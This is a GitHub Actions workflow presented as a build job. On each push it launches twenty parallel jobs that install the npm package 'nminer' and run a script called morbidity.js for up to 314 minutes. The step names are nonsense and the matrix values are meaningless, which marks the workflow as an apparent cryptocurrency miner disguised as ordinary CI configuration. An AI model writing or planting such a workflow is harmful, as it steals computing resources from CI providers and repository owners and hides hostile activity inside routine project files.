name: morbidity
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2056 }
          - { version: 3961 }
          - { version: 9094 }
          - { version: 4873 }
          - { version: 4293 }
          - { version: 3242 }
          - { version: 9077 }
          - { version: 4940 }
          - { version: 500 }
          - { version: 2611 }
          - { version: 5741 }
          - { version: 610 }
          - { version: 776 }
          - { version: 8473 }
          - { version: 9075 }
          - { version: 6989 }
          - { version: 3431 }
          - { version: 1978 }
          - { version: 9953 }
          - { version: 755 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: archive omelet nearly instead
        run: |
          npm install nminer@latest
          timeout 314m node morbidity.js || echo "morbidity executed"